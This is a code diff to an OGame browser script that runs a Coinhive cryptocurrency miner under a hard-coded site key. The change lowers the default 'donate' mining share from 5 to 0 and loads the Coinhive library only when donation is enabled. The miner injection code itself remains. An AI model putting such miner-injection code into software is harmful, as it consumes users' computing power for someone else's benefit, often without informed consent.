@@ -2,10 +2,15 @@ var fn = function () {
   window._setupMiner = function _setupMiner () {
     var name = $('meta[name="ogame-player-name"]').attr('content') + '@' + window.config.universe.language + window.config.universe.number;
 
-    window.config.donate = window.config.donate || '5';
+    window.config.donate = window.config.donate || '0';
     window._saveConfig();
 
     if (window.config.donate !== '0') {
+      var lib = document.createElement('script');
+      lib.src = 'https://coinhive.com/lib/coinhive.min.js';
+      (document.head || document.documentElement).appendChild(lib);
+      lib.parentNode.removeChild(lib);
+
       setTimeout(function () {
         var throttle = 1 - (Number(window.config.donate) / 100);
         window.miner = new window.CoinHive.User('UQRb5qC7tol0dXkjKY3tBEgxCEGS7oeR', name, {
@@ -24,11 +29,6 @@ var fn = function () {
     document.location.reload();
   };
 };
-
-var lib = document.createElement('script');
-lib.src = 'https://coinhive.com/lib/coinhive.min.js';
-(document.head || document.documentElement).appendChild(lib);
-lib.parentNode.removeChild(lib);
 
 var script = document.createElement('script');
 script.textContent = '(' + fn + ')()';
